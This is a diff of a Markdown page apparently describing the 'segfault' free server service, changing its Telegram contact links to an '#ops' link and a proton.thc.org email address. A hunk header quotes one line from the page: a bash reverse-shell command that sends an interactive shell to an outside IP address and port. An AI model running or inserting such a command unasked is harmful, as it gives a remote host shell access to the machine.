@@ -115,7 +115,7 @@ setsid bash -i &>/dev/tcp/185.117.118.23/34868 0>&1 &
 
 ## How it works
 
-Read the [FAQ](faq) and join us on [Telegram](https://t.me/thcorg) or read the source on [GitHub](https://github.com/hackerschoice/segfault).
+Read the [FAQ](faq) and [join #ops](https://thc.org/ops) or read the source on [GitHub](https://github.com/hackerschoice/segfault).
 
 This is a **free service** and there are [some restrictions](free) in place. You may want to [upgrade your server](token) and go unrestricted.
 
@@ -135,7 +135,7 @@ This is a **free service** and there are [some restrictions](free) in place. You
 
 ## Love Research. Hate Abuse.
 
-We do not tolerate abuse. Contact us on [Telegram](https://t.me/thcorg) or email root at thc.org if you have any concerns.
+We do not tolerate abuse. Contact us at root at proton.thc.org if you have any concerns.
 
 ## Contact
 
